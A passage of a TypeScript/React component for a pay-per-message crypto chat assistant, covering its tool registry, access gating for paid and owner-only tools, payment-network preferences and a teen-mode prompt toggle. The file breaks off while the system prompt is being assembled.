/**
 * AssistantChat — the interactive core of the x402 batch-settlement chat assistant
 * (`/assistent`). Pays per message via `useX402Chat` (USDC payment channels): the
 * first message opens a channel (one wallet-signed deposit), later messages are
 * off-chain voucher signatures reusing the open channel.
 */

import React, { useState, useMemo, useEffect, useRef, useSyncExternalStore } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { AgentInfoPanel } from "./AgentInfoPanel";
import { AgentSelector } from "./AgentSelector";
import { ToolSelector } from "./ToolSelector";
import { ToolConfirmCard, type ToolSize } from "./ToolConfirmCard";
import * as chat from "./AssistantChat.styles";
import { useLocale } from "../hooks/useLocale";
import { useUmami } from "../hooks/useUmami";
import { css } from "../styled-system/css";
import { useWalletConnection } from "../hooks/useWalletConnection";
import { useAutoNetwork } from "../hooks/useAutoNetwork";
import { useX402Chat, DEFAULT_LLM_AGENT_URL } from "../hooks/useX402Chat";
import { useX402ImageGeneration } from "../hooks/useX402ImageGeneration";
import { fetchAgentCard, precheckLlmV1Agent, type AgentCard } from "../hooks/x402Discovery";
import { generateImageTool, runImageTool } from "../tools/generateImage";
import {
  getSitzungenTool,
  searchClaimsTool,
  fetchSitzungen,
  fetchClaims,
  selectSitzungen,
  selectClaims,
  fetchFailed,
  type BundestaktResult,
} from "../tools/bundestakt";
import {
  getAnalyticsTool,
  fetchStats,
  selectAnalytics,
  fetchFailed as analyticsFetchFailed,
  type AnalyticsResult,
} from "../tools/analytics";
import {
  getPageTool,
  fetchContentIndex,
  fetchPageHtml,
  extractPageText,
  selectIndex,
  selectPage,
  pagePath,
  indexUnavailable,
  fetchFailed as pageFetchFailed,
  type PageResult,
} from "../tools/page";
import {
  searchWebTool,
  fetchSearch,
  selectSearch,
  normalizeQuery,
  fetchFailed as searchFetchFailed,
  type SearchToolResult,
} from "../tools/search";
import {
  fetchUrlTool,
  fetchViaProxy,
  selectFetched,
  normalizeFetchUrl,
  fetchFailed as webFetchFailed,
  type FetchToolResult,
} from "../tools/webFetch";
import { paymentFailed } from "../tools/failure";
import { useWalletAuth } from "../hooks/useWalletAuth";
import { isOwnerAddress, type OwnerScope } from "../utils/getChain";
import type { X402ChatMessage, X402Tool, X402ToolCall } from "../types/x402";
import { runToolLoop, type ToolRunResult } from "../utils/toolLoop";
import { formatDateContext } from "../utils/dateContext";
import { createLocalStorageStore } from "../utils/localStorageStore";
import { useQueryClient } from "@tanstack/react-query";
import { getViemChain, toCAIP2, fromCAIP2, getGenAiNFTMainnetNetworks } from "@fretchen/chain-utils";
import { useChainId } from "wagmi";
import { ChainBadge, getChainName } from "./ChainBadge";
import { button } from "../styled-system/recipes";
import { PageHeader } from "./PageHeader";

/**
 * Which tools oblige the answer to name where it got its facts. Bundestakt is a CC BY licence
 * requirement; analytics is about honesty — a figure about this site should say it was looked up
 * rather than read as something the model knew.
 */
type ToolSource = "bundestakt" | "analytics" | "brave";

/**
 * Everything offered to the model, with what the chat loop needs to know about a tool besides its
 * schema: who may be offered it, whether a stranger's agent may be, whether it costs the user
 * money, and whether its answer must cite a source.
 *
 * `ownerScope: null` means anyone; an owner scope means the endpoint answers 401 to everyone else,
 * so offering it to a visitor would burn a hop on a guaranteed failure and put the tool's
 * description in front of the upstream model for people it can never serve.
 *
 * `defaultAgentOnly` is a separate question from `ownerScope`, because a tool can be open to every
 * visitor and still be one a third-party agent must never be handed. See `availableTools`.
 *
 * `paid` means the runner spends USDC per call, which is what `runToolLoop` bounds. The image tool
 * is deliberately not `paid`: it pays on its own scheme and asks the user first.
 *
 * All four fields are required, so adding a tool and forgetting a gate is a type error rather than
 * a silently ungated tool. The metadata sits beside the tool rather than on it because these
 * objects go on the wire as `tools:` — extra keys would be sent upstream.
 *
 * Hoisted for a stable identity across renders; the loop filters it as tools fail, which is why
 * the array itself stays constant.
 */
export const TOOL_REGISTRY = [
  {
    tool: generateImageTool,
    label: "assistent.toolImageGeneration",
    ownerScope: null,
    defaultAgentOnly: false,
    paid: false,
    source: null,
  },
  {
    tool: getSitzungenTool,
    label: "assistent.toolBundestagSessions",
    ownerScope: null,
    defaultAgentOnly: false,
    paid: false,
    source: "bundestakt",
  },
  {
    tool: searchClaimsTool,
    label: "assistent.toolFactChecks",
    ownerScope: null,
    defaultAgentOnly: false,
    paid: false,
    source: "bundestakt",
  },
  {
    tool: getPageTool,
    label: "assistent.toolSiteContent",
    ownerScope: null,
    defaultAgentOnly: false,
    paid: false,
    source: null,
  },
  // Open to anyone — the visitor pays $0.01 per search from the channel their chat already
  // funded — but never offered to a third-party agent, which would be spending someone else's
  // escrow on prompts of its own choosing.
  {
    tool: searchWebTool,
    label: "assistent.toolWebSearch",
    ownerScope: null,
    defaultAgentOnly: true,
    paid: true,
    source: "brave",
  },
  // Same terms as search, at a tenth the price. `source: null` because the citation *is* the url,
  // which the result carries and the prompt already requires the answer to link.
  {
    tool: fetchUrlTool,
    label: "assistent.toolFetchUrl",
    ownerScope: null,
    defaultAgentOnly: true,
    paid: true,
    source: null,
  },
  {
    tool: getAnalyticsTool,
    label: "assistent.toolSiteAnalytics",
    ownerScope: "analytics",
    defaultAgentOnly: true,
    paid: false,
    source: "analytics",
  },
] as const satisfies readonly {
  tool: X402Tool;
  /**
   * Locale key for the name shown in the ToolSelector, resolved there with `LocaleText`.
   * Required, so a new tool cannot arrive without a readable name — a key rather than a literal
   * because this list is read by visitors as "what I can do", and that has to be German on the
   * German routes. Metadata beside the tool, never on the wire.
   */
  label: string;
  ownerScope: OwnerScope | null;
  /** Withheld while a custom agent is selected, whoever the user is. */
  defaultAgentOnly: boolean;
  /** The runner spends USDC per call, so it counts against the turn's budget. */
  paid: boolean;
  source: ToolSource | null;
}[];

// Hoisted so the array identity is stable across renders. Mainnet-only on purpose — see the
// useAutoNetwork call in the component for why a testnet entry here would be a real hazard.
const IMAGE_TOOL_NETWORKS = getGenAiNFTMainnetNetworks();

/**
 * The execution half of the tool contract. `TOOL_REGISTRY` above says what exists and who may use
 * it; a runner says how to do it.
 *
 * Runners are built in the component rather than exported from the tool modules, because what a
 * tool needs differs per tool and some of it only exists inside React: `get_analytics` closes over
 * the auth callback and the query cache, `generate_image` over the wallet, the network switch and
 * the confirm card. A shared `ctx` object would have to carry the union of every tool's needs and
 * grow with each new one; a closure carries exactly what its own tool uses — and a future `date`
 * tool closes over nothing at all.
 *
 * The tool *modules* stay React-free (`fetchX` + `selectX`), which is what keeps them importable
 * from a non-browser caller. The runners are the wiring, not the subject matter.
 */
type ToolRunner = (args: Record<string, unknown>) => Promise<ToolRunResult>;

/** Tool arguments arrive as a JSON *string*. Malformed ones become `{}` rather than an error:
 *  the selectors treat every field as optional, so an argument-less call still returns data. */
function parseToolArgs(call: X402ToolCall): Record<string, unknown> {
  try {
    return JSON.parse(call.function.arguments) as Record<string, unknown>;
  } catch {
    return {};
  }
}

// The custom-URL escape hatch (AgentSelector) lets the chat pay any llm/v1 agent. It is also
// the only ready-made batch-settlement client there is, so it doubles as the end-to-end test
// for anyone following the build guide at /agent-onboarding. A curated picker (rather than a
// URL box) waits until there are enough compatible agents to be worth listing.

interface ChatMessage {
  role: "user" | "assistant";
  content: string;
  timestamp: number;
  /** Set when this turn's answer came after a generate_image tool call. Display only — never
   *  sent back to the model; the model's own closing text is its memory of having made it. */
  imageUrl?: string;
  /** The data sources that actually fed this answer. Display only, like imageUrl — never sent
   *  back to the model. Filled only from successful lookups, since a failed one contributed
   *  nothing to cite. See TOOL_SOURCES for why each one is named. */
  sources?: ToolSource[];
}

/** The confirm card's lifecycle. No "failed" phase: a cancel or error clears the card
 *  immediately and the tool result carries the status — the *next* hop's assistant text
 *  explains what happened, so there is nothing further for the card itself to show. */
type ToolCardState = { phase: "confirm" | "generating"; prompt: string; size: ToolSize };

// Production mainnets. Real USDC, real Mistral responses. Optimism is first, so it is the
// default for a wallet that is on neither; a wallet already on Base keeps paying on Base
// (useAutoNetwork honours the connected chain whenever it is in this list).
const CHAT_NETWORKS = ["eip155:10", "eip155:8453"] as const;

// localStorage key for the user's explicit network choice. Worth persisting rather than
// re-deriving from the wallet each visit: a channel is per (network, receiver) and each one
// escrows MINIMUM_DEPOSIT_ATOMIC ($0.50, see useX402Chat). If the paid network drifted with
// whatever chain the wallet happened to be on, a user would silently open a second channel
// and lock a second $0.50 that only comes back via a refund or the 24h withdrawDelay.
const NETWORK_PREFERENCE_KEY = "x402-chat-network";

/**
 * The preference as an external store (see utils/localStorageStore.ts for why that shape). The
 * explicit server snapshot at the call site — always null → the Optimism default — is what keeps
 * the server-rendered markup and the first client render in agreement.
 */
const networkStore = createLocalStorageStore(NETWORK_PREFERENCE_KEY);

function readStoredNetwork(): string | null {
  const stored = networkStore.read();
  // Ignore a network the site no longer pays on (an old testnet, a dropped chain).
  return stored && (CHAT_NETWORKS as readonly string[]).includes(stored) ? stored : null;
}

const storeNetwork = (network: string): void => networkStore.write(network);

/**
 * The tools the user has switched *off*, as an external store mirroring the network preference
 * above.
 *
 * Storing the disabled names rather than the enabled ones is what makes a newly added tool
 * available by default instead of invisible until someone discovers the panel — and it means an
 * existing user notices nothing when one lands.
 *
 * The snapshot stays the raw string on purpose. `useSyncExternalStore` compares snapshots with
 * `Object.is`, so returning a freshly built `Set` here would re-render forever; the component
 * parses the string once in a `useMemo` instead.
 */
const DISABLED_TOOLS_KEY = "x402-chat-disabled-tools";

const disabledToolsStore = createLocalStorageStore(DISABLED_TOOLS_KEY);

const readStoredDisabledTools = (): string => disabledToolsStore.read() ?? "";

const storeDisabledTools = (names: ReadonlySet<string>): void => disabledToolsStore.write([...names].join(","));

/**
 * Teen mode: a tone-and-behaviour profile, chosen by whoever is using the chat.
 *
 * A feature, not a parental control — nothing enforces it, and it is deliberately not tied to the
 * wallet, the payment or any notion of identity. It therefore needs nothing more than a stored
 * boolean: everything it changes lives in the appended system prompt (`assistent.systemPromptTeen`),
 * so there is no server-side profile to keep honest and no request parameter a browser could lie
 * about anyway.
 *
 * The stored value is the string "on" or nothing at all, mirroring the two preferences above.
 */
const TEEN_MODE_KEY = "x402-chat-teen-mode";

const teenModeStore = createLocalStorageStore(TEEN_MODE_KEY);

const readStoredTeenMode = (): string => teenModeStore.read() ?? "";

const storeTeenMode = (enabled: boolean): void => teenModeStore.write(enabled ? "on" : "");

/** Build a block-explorer tx link for the given CAIP-2 network via its viem chain config. */
function explorerTxUrl(network: string, txHash: string): string | null {
  if (!txHash) return null;
  try {
    const base = getViemChain(network).blockExplorers?.default?.url;
    return base ? `${base}/tx/${txHash}` : null;
  } catch {
    return null;
  }
}

export function AssistantChat() {
  const { trackEvent } = useUmami();

  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [currentInput, setCurrentInput] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Localized messages (reuse the existing assistent.* namespace)
  const systemPromptMessage = useLocale({ label: "assistent.systemPrompt" });
  const teenPromptMessage = useLocale({ label: "assistent.systemPromptTeen" });
  const teenModeLabel = useLocale({ label: "assistent.teenMode" });
  const teenModeOfferLabel = useLocale({ label: "assistent.teenModeOffer" });
  const noResponseMessage = useLocale({ label: "assistent.noResponse" });
  const imageReadyMessage = useLocale({ label: "assistent.imageReady" });
  const bundestaktSourceLabel = useLocale({ label: "assistent.bundestaktSource" });
  const analyticsSourceLabel = useLocale({ label: "assistent.analyticsSource" });
  const braveSourceLabel = useLocale({ label: "assistent.braveSource" });
  // Here rather than at module scope because the labels are translated per render.
  const sourceLinks: Record<ToolSource, { href: string; label: string }> = {
    bundestakt: { href: "https://www.bundestakt.de", label: bundestaktSourceLabel },
    analytics: { href: "/analytics", label: analyticsSourceLabel },
    brave: { href: "https://search.brave.com", label: braveSourceLabel },
  };
  const errorPrefixMessage = useLocale({ label: "assistent.errorPrefix" });
  const connectWalletMessageLabel = useLocale({ label: "assistent.connectWalletMessage" });
  const loadingLabel = useLocale({ label: "assistent.loading" });
  const sendLabel = useLocale({ label: "assistent.send" });
  const unknownErrorLabel = useLocale({ label: "assistent.unknownError" });
  const typingLabel = useLocale({ label: "assistent.typing" });
  const toppingUpLabel = useLocale({ label: "assistent.toppingUp" });
  const advancedLabel = useLocale({ label: "assistent.advanced" });
  const clearChatLabel = useLocale({ label: "assistent.clearChat" });
  const titleLabel = useLocale({ label: "assistent.title" });
  const emptyStateLabel = useLocale({ label: "assistent.emptyState" });
  const youLabel = useLocale({ label: "assistent.you" });
  const assistantLabel = useLocale({ label: "assistent.assistant" });
  const placeholderLabel = useLocale({ label: "assistent.placeholder" });
  const viewPaymentLabel = useLocale({ label: "assistent.viewPayment" });
  const networkLabel = useLocale({ label: "assistent.network" });
  const networkFallbackLabel = useLocale({ label: "assistent.networkFallback" });

  // Mobile detection
  React.useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  const { address, isConnected, connectWallet } = useWalletConnection();

  // Same check as pages/analytics and pages/growth: isConnected is reconnect-aware and
  // hydration-safe, so the owner test never trusts `address` before wagmi has reconnected.
  const hasOwnerScope = (scope: OwnerScope) => isConnected && isOwnerAddress(address, scope);

  // The user's explicit network choice, if they made one.
  const preferredNetwork = useSyncExternalStore(networkStore.subscribe, readStoredNetwork, () => null);

  // The raw string is the snapshot (see readStoredDisabledTools); parsed once here so the Set
  // keeps a stable identity between renders.
  const disabledToolsRaw = useSyncExternalStore(disabledToolsStore.subscribe, readStoredDisabledTools, () => "");
  const disabledTools = useMemo(
    () => new Set(disabledToolsRaw.split(",").filter((name) => name.length > 0)),
    [disabledToolsRaw],
  );

  // Server snapshot is "" — off — so the SSR markup and the first client render agree about an
  // unchecked box, and localStorage takes over only once it exists.
  const teenMode = useSyncExternalStore(teenModeStore.subscribe, readStoredTeenMode, () => "") === "on";

  // A custom agent, once one has been pre-checked and accepted. Null = the default agent.
  // Declared above `availableTools` because the owner-scope gate below reads it.
  const [customUrl, setCustomUrl] = useState<string | null>(null);
  const [customCard, setCustomCard] = useState<AgentCard | null>(null);
  const [customUrlInput, setCustomUrlInput] = useState("");
  const [checkState, setCheckState] = useState<"idle" | "checking" | "error">("idle");
  const [checkError, setCheckError] = useState<string | null>(null);

  /**
   * The tools this visitor may use at all — the selector never offers what the gate would refuse.
   *
   * Two independent conditions, because "who may call this tool" and "who may read its answer" are
   * different questions. A tool result is JSON-serialised into `convo` and sent to whichever agent
   * is selected on the next hop, so a tool offered while a custom agent is in use hands that
   * stranger whatever it returns — and the *agent*, not the user, decides when to call it. That is
   * why `defaultAgentOnly` is its own flag rather than a reading of `ownerScope`: it covers the
   * owner-scoped tools, whose output is private, and the paid ones, which spend the visitor's
   * escrow. Switching agents stays free; those tools simply are not on the menu while a third
   * party is being paid.
   */
  const availableTools = useMemo(
    () =>
      TOOL_REGISTRY.filter(
        (entry) =>
          (entry.ownerScope === null || hasOwnerScope(entry.ownerScope)) &&
          (!entry.defaultAgentOnly || customUrl === null),
      ),
    // eslint-disable-next-line react-hooks/exhaustive-deps -- hasOwnerScope is derived from the first two
    [isConnected, address, customUrl],
  );

  /** Rendered in two places (sidebar and mobile footer) with identical props — computed once so
   *  the two can't quietly drift. */
  const toolSelectorOptions = availableTools.map((entry) => ({ name: entry.tool.function.name, label: entry.label }));

  /**
   * Built once for the same reason as `toolSelectorOptions`: it renders in the sidebar and in the
   * mobile footer, and the two must not drift.
   *
   * Sits at the *top* of the panel, above the agent and the tools, because it is a mode rather
   * than a tool — it governs everything below it. It spent a version under the tool checkboxes,
   * where it read as a sixth tool and nobody would ever have scrolled to it.
   *
   * A native checkbox on purpose: keyboard behaviour, focus and screen-reader semantics come
   * free, and `accentColor` is all it takes to put it in the mode's hue.
   */
  const teenToggle = (
    <label
      className={css({
        display: "flex",
        alignItems: "center",
        gap: "2",
        fontSize: "sm",
        fontWeight: "semibold",
        color: "text",
        cursor: "pointer",
        accentColor: "teen",
      })}
    >
      <input type="checkbox" checked={teenMode} onChange={(event) => storeTeenMode(event.target.checked)} />
      <span>{teenModeLabel}</span>
    </label>
  );

  const toggleTool = (name: string, enabled: boolean) => {
    const next = new Set(disabledTools);
    if (enabled) next.delete(name);
    else next.add(name);
    storeDisabledTools(next);
  };

  // Precedence: explicit choice → the wallet's own chain if we support it → Optimism.
  const walletNetwork = toCAIP2(useChainId());
  const desiredNetwork =
    preferredNetwork ??
    ((CHAT_NETWORKS as readonly string[]).includes(walletNetwork) ? walletNetwork : CHAT_NETWORKS[0]);

  const agentUrl = customUrl ?? DEFAULT_LLM_AGENT_URL;
  // The hook may negotiate away from `desiredNetwork` when the agent doesn't offer it (e.g. a
  // Base-only third-party agent while the user prefers Optimism), so the wallet must be
  // switched to what will actually be paid — `paymentNetwork`, not the preference.
  const {
    sendMessage: payAndSend,
    paidFetch,
    paymentReceipt,
    paymentNetwork,
    status: chatStatus,
  } = useX402Chat(desiredNetwork, agentUrl);
  const { network, switchIfNeeded, getSwitchError } = useAutoNetwork([paymentNetwork]);

  // The image tool pays on a different network/scheme (exact, genimg's own wallet signature)
  // than chat's batch-settlement channel — see useX402ImageGeneration.ts. It does not switch
  // chains itself, hence the second useAutoNetwork here.
  //
  // MAINNET only, unlike ImageGenerator.tsx's useAutoNetwork(GENAI_NFT_NETWORKS): that list also
  // contains OP Sepolia, and useAutoNetwork keeps the wallet's current chain whenever it is in
  // the list. A wallet left on Sepolia from earlier testing would therefore make switchIfNeeded
  // a no-op and generate a *placeholder* image against the testnet mock — while the chat itself,
  // whose CHAT_NETWORKS are mainnet-only, had already taken a real USDC deposit. The standalone
  // /imagegen page can afford the testnet entry because it has a visible network picker; this
  // tool has none beyond the confirm card's badge.
  const {
    network: imageNetwork,
    switchIfNeeded: switchImageIfNeeded,
    getSwitchError: getImageSwitchError,
  } = useAutoNetwork(IMAGE_TOOL_NETWORKS);
  const { generateImage } = useX402ImageGeneration();
  // Bundestakt's caching lives here rather than in tools/bundestakt.ts — see loadBundestakt().
  const queryClient = useQueryClient();
  // Same auth prefix as useAnalyticsStats, so a visit to /analytics in the last 4 minutes leaves
  // the token cached and the tool call costs no signature at all.
  const getAnalyticsAuth = useWalletAuth("analytics-api");

  // The confirm card is transient UI state, never a chat message — it cannot be scrolled back
  // to or replayed. `confirmResolverRef` is how a linear async loop (sendMessage) pauses for a
  // user click without turning into a state machine: waitForConfirmation() below stores the
  // Promise's resolve function here, and the card's own buttons call it.
  const [toolCard, setToolCard] = useState<ToolCardState | null>(null);
  const confirmResolverRef = useRef<
    ((r: { action: "confirm"; prompt: string; size: ToolSize } | { action: "cancel" }) => void) | null
  >(null);

  // Provenance of the agent actually serving this chat (operator + payTo + origin), read
  // live from its own /openapi.json + 402 so the sidebar can honestly show who the user pays.
  const [agentCard, setAgentCard] = useState<AgentCard | null>(null);
  useEffect(() => {
    let cancelled = false;
    void fetchAgentCard(DEFAULT_LLM_AGENT_URL).then((card) => {
      if (!cancelled) setAgentCard(card);
    });
    return () => {
      cancelled = true;
    };
  }, []);

  // The card shown (and paid) is the custom agent's whenever one is selected.
  const activeCard = customCard ?? agentCard;

  const tryCustomAgent = async () => {
    const url = customUrlInput.trim();
    if (!url) return;
    setCheckState("checking");
    setCheckError(null);
    const result = await precheckLlmV1Agent(url);
    if (!result.ok) {
      setCheckState("error");
      setCheckError(result.reason ?? "This agent is not compatible.");
      return;
    }
    setCheckState("idle");
    setCustomUrl(url);
    setCustomCard(result.card ?? null);
    setMessages([]);
    trackEvent("assistant-v2-custom-agent-selected");
  };

  const useDefaultAgent = () => {
    setCustomUrl(null);
    setCustomCard(null);
    setCustomUrlInput("");
    setCheckState("idle");
    setCheckError(null);
    setMessages([]);
  };

  const buttonState = useMemo(() => {
    if (!isConnected) return "connect";
    if (isLoading) return "loading";
    if (!currentInput.trim()) return "empty";
    return "ready";
  }, [isConnected, isLoading, currentInput]);

  const getButtonText = (state: string) => {
    switch (state) {
      case "connect":
        return connectWalletMessageLabel;
      case "loading":
        return loadingLabel;
      default:
        return sendLabel;
    }
  };

  /** Pauses the loop until the confirm card's Generate/Cancel resolves it. */
  function waitForConfirmation(prompt: string, size: ToolSize) {
    return new Promise<{ action: "confirm"; prompt: string; size: ToolSize } | { action: "cancel" }>((resolve) => {
      confirmResolverRef.current = resolve;
      setToolCard({ phase: "confirm", prompt, size });
    });
  }

  /**
   * Wires `runImageTool` to what only exists in here. The sequence itself, its statuses and its
   * error classification live in `tools/generateImage.ts`; this supplies the card, the network
   * switch and the paid call, and clears the card once in a `finally` rather than in every branch.
   */
  async function runImageToolHere(args: Record<string, unknown>): Promise<ToolRunResult> {
    try {
      return await runImageTool(args, {
        confirm: waitForConfirmation,
        ensureNetwork: async () => ((await switchImageIfNeeded()) ? null : (getImageSwitchError() ?? "")),
        generate: async (prompt, size) => {
          const image = await generateImage({
            prompt,
            size,
            network: imageNetwork,
            expectedChainId: fromCAIP2(imageNetwork),
            isListed: false, // never a chat-time decision — see the confirm card's mint notice instead
          });
          return { imageUrl: image.imageUrl, network: imageNetwork };
        },
        onPhase: setToolCard,
      });
    } finally {
      setToolCard(null);
    }
  }

  /**
   * Fetches one Bundestakt endpoint and projects it. `tools/bundestakt.ts` is deliberately
   * stateless, so the caching policy lives here: both endpoints are whole-dump GETs (71 KB and
   * 912 KB), and the intended flow calls `/sitzungen` twice in one turn — once to list, once
   * for the chosen slug — so a per-turn cache is the difference between one download and two.
   */
  async function loadBundestakt(kind: "sitzungen" | "claims", args: Record<string, unknown>): Promise<ToolRunResult> {
    try {
      const raw = await queryClient.fetchQuery({
        queryKey: ["bundestakt", kind],
        queryFn: kind === "sitzungen" ? fetchSitzungen : fetchClaims,
        staleTime: 5 * 60_000,
        retry: 0,
      });
      const result: BundestaktResult = kind === "sitzungen" ? selectSitzungen(raw, args) : selectClaims(raw, args);
      // An unrecognized slug is an answer, not a malfunction: the list-then-detail flow in the
      // system prompt depends on the model being able to retry with a corrected one, so the tool
      // has to stay on offer for the rest of the turn.
      return { result, recoverable: result.status === "not_found" };
    } catch (err) {
      // fetchQuery rethrows the fetcher's error; the module owns the wire-level failure shape.
      return { result: fetchFailed(err) };
    }
  }

  /**
   * Reads the site's own traffic figures. `GET /stats` takes no range and always returns the
   * trailing year, so it is fetched once and every `range` is a local slice of that one payload.
   *
   * `getAnalyticsAuth()` opens a wallet signature prompt when its 4-minute token cache is cold —
   * unusual for a silent tool, but unavoidable for an owner-gated endpoint, and free whenever the
   * owner has touched /analytics recently.
   */
  async function loadAnalytics(args: Record<string, unknown>): Promise<AnalyticsResult> {
    try {
      const auth = await getAnalyticsAuth();
      const raw = await queryClient.fetchQuery({
        queryKey: ["analytics", "stats"],
        queryFn: () => fetchStats(auth),
        staleTime: 5 * 60_000,
        retry: 0,
      });
      return selectAnalytics(raw, typeof args.range === "string" ? args.range : undefined);
    } catch (err) {
      return analyticsFetchFailed(err);
    }
  }

  /**
   * A paid tool's failure, as the model should read it.
   *
   * A payment that did not go through is its own status — saying "I found nothing" when the channel
   * is empty would be false — and only `channel_busy` is worth another hop, since that lock clears
   * in seconds. Everything else is the request failing, which is the tool's own `fetch_failed`.
   */
  function paidToolFailure(err: unknown, requestFailed: (err: unknown) => ToolRunResult["result"]): ToolRunResult {
    const payment = paymentFailed(err);
    if (payment) {
      return { result: payment, recoverable: payment.status === "channel_busy" };
    }
    return { result: requestFailed(err), recoverable: true };
  }

  /**
   * Searches the live web, paid per call on the chat's own payment channel.
   *
   * Cached per turn for the same reason as the other lookups, and here the cache is money: a cache
   * hit is served without a payment, so a model that asks the same question twice in one turn is
   * billed once.
   *
   * A failed request stays recoverable — an empty result set and a rejected query are both answered
   * by rephrasing, and one retry with different words is worth a hop. A failed *payment* is not;
   * see `paidToolFailure`.
   */
  async function loadSearch(args: Record<string, unknown>): Promise<ToolRunResult> {
    const query = normalizeQuery(args.query);
    if (!query) {
      return { result: { status: "no_query" } as SearchToolResult, recoverable: true };
    }

    try {
      const raw = await queryClient.fetchQuery({
        queryKey: ["search", query],
        queryFn: () => fetchSearch(query, paidFetch),
        staleTime: 5 * 60_000,
        retry: 0,
      });
      return { result: selectSearch(raw, query), recoverable: true };
    } catch (err) {
      return paidToolFailure(err, searchFetchFailed);
    }
  }

  /**
   * Reads one arbitrary web page, through the same paid function as search — $0.001 rather than
   * $0.01, since no metered API sits behind it.
   *
   * Cached per turn because the intended flow reads a page and then asks for one of its sections,
   * which is the same document twice — and unlike this site's own pages, that one is a stranger's
   * bandwidth.
   *
   * Everything is recoverable: a refused scheme, a private address, a PDF, a JavaScript shell are
   * all answered by trying a different url, which is exactly what the model should do next.
   */
  async function loadFetch(args: Record<string, unknown>): Promise<ToolRunResult> {
    const url = normalizeFetchUrl(args.url);
    if (!url) {
      return {
        result: {
          status: "invalid_url",
          // Echoed back only when it really was a string; anything else would stringify to
          // "[object Object]" and tell the model it had sent something it had not.
          url: typeof args.url === "string" ? args.url : "",
          hint: "Only absolute https urls can be fetched.",
        } satisfies FetchToolResult,
        recoverable: true,
      };
    }

    try {
      const raw = await queryClient.fetchQuery({
        queryKey: ["web-fetch", url],
        queryFn: () => fetchViaProxy(url, paidFetch),
        staleTime: 5 * 60_000,
        retry: 0,
      });
      return { result: selectFetched(raw, args.section), recoverable: true };
    } catch (err) {
      return paidToolFailure(err, webFetchFailed);
    }
  }

  /**
   * Reads this site's own pages: no `url` lists them, a `url` returns that page's text.
   *
   * Cached per turn like Bundestakt, and for the same reason doubled: the intended flow calls this
   * twice or three times in one turn — list, read, then often one section of the same page — and
   * the page HTML behind those last two calls is the identical 50 KB document. Content is static
   * between deploys, so the stale time is generous.
   *
   * Every failure here leaves the tool on offer, and the page list is the reason why.
   *
   * The loop withdraws a failed tool per *tool*, not per call (utils/toolLoop.ts), and this one
   * has two independent halves behind a single name: listing the pages, and reading one. Reading
   * never touches the index. So marking a failed index fetch unrecoverable — which it is, in the
   * sense that retrying it changes nothing — withdrew the half that still worked, and a request
   * naming a url outright could no longer be served. That happened: asked to read /blog/36, the
   * model listed first because it was told to, lost the tool to a 404 on the index, and answered
   * from nothing. The index result carries a hint pointing at the url form instead, which costs
   * one hop rather than the whole turn.
   */
  async function loadPage(args: Record<string, unknown>): Promise<ToolRunResult> {
    const wantsIndex = args.url === undefined || args.url === null || args.url === "";

    try {
      if (wantsIndex) {
        const raw = await queryClient.fetchQuery({
          queryKey: ["content-index"],
          queryFn: fetchContentIndex,
          staleTime: 60 * 60_000,
          retry: 0,
        });
        return { result: selectIndex(raw), recoverable: true };
      }

      const path = pagePath(args.url);
      if (!path) {
        return { result: { status: "invalid_url", url: String(args.url) } as PageResult, recoverable: true };
      }

      const html = await queryClient.fetchQuery({
        queryKey: ["page", path],
        queryFn: () => fetchPageHtml(path),
        staleTime: 60 * 60_000,
        retry: 0,
      });
      return { result: selectPage(extractPageText(html), path, args.section), recoverable: true };
    } catch (err) {
      // fetchQuery rethrows the fetcher's error; the module owns the wire-level failure shape.
      // A missing index is reported as such, with the way around it, rather than as a bare
      // network error the model can only give up on.
      return { result: wantsIndex ? indexUnavailable() : pageFetchFailed(err), recoverable: true };
    }
  }

  /**
   * How to run each tool, keyed by wire name. Only `generate_image` is confirmation-gated and
   * costs money; the Bundestakt, site-content and analytics lookups are free and read-only, so
   * they run silently.
   *
   * Rebuilt each render, which is harmless: it is only ever read inside `sendMessage`, an event
   * handler. Memoising it would need a dependency list covering every closure above, and a wrong
   * one is worse than none.
   */
  // Object.create(null): a plain object literal inherits Object.prototype, so a forged tool name
  // like "constructor" would resolve to a truthy, callable value and bypass dispatch entirely.
  const toolRunners: Record<string, ToolRunner> = Object.create(null) as Record<string, ToolRunner>;
  toolRunners[generateImageTool.function.name] = runImageToolHere;
  toolRunners[getSitzungenTool.function.name] = (args) => loadBundestakt("sitzungen", args);
  toolRunners[searchClaimsTool.function.name] = (args) => loadBundestakt("claims", args);
  toolRunners[getPageTool.function.name] = loadPage;
  toolRunners[searchWebTool.function.name] = loadSearch;
  toolRunners[fetchUrlTool.function.name] = loadFetch;
  toolRunners[getAnalyticsTool.function.name] = async (args) => ({ result: await loadAnalytics(args) });

  /** Dispatches one tool call by name, or tells the model it invented one. */
  async function runToolCall(call: X402ToolCall): Promise<ToolRunResult> {
    const run = toolRunners[call.function.name];
    if (!run) {
      // A model that invents a tool name gets told so and can correct itself, rather than the
      // whole message failing.
      return { result: { status: "unknown_tool" } };
    }
    return run(parseToolArgs(call));
  }

  const sendMessage = async (userMessage: string) => {
    if (!userMessage.trim() || isLoading) return;

    setIsLoading(true);

    if (messages.length === 0) {
      trackEvent("assistant-v2-first-message-sent", {
        messageLength: userMessage.trim().length,
        isMobile: isMobile,
      });
    }

    const userMsg: ChatMessage = {
      role: "user",
      content: userMessage.trim(),
      timestamp: Date.now(),
    };
    setMessages((prev) => [...prev, userMsg]);
    setCurrentInput("");

    try {
      // Full conversation history, as the OpenAI `messages[]` array sc_llm_x402 expects. Tool
      // turns pushed inside the loop below live only in this local array — never in `messages`
      // state, so a previous tool call is never replayed to the model on a later message. Its
      // own final text turn is the model's whole memory of having made an image.
      const convo: X402ChatMessage[] = [
        {
          role: "system",
          // Read at send time, not at render time: `sendMessage` is an event handler, so there is
          // no server/client clock mismatch to hydrate, and a session left open over midnight
          // picks up the new date by itself on the next message. Teen mode is read here for the
          // same reason, so toggling it mid-conversation takes effect on the very next message.
          //
          // Appended, never substituted: the base prompt is this chat's tool contract — the
          // get_sitzungen slug flow, get_page truncation, the fetch_url injection defence — and a
          // parallel teen copy of all that would drift the first time a tool is added.
          content: [
            systemPromptMessage,
            teenMode ? teenPromptMessage : null,
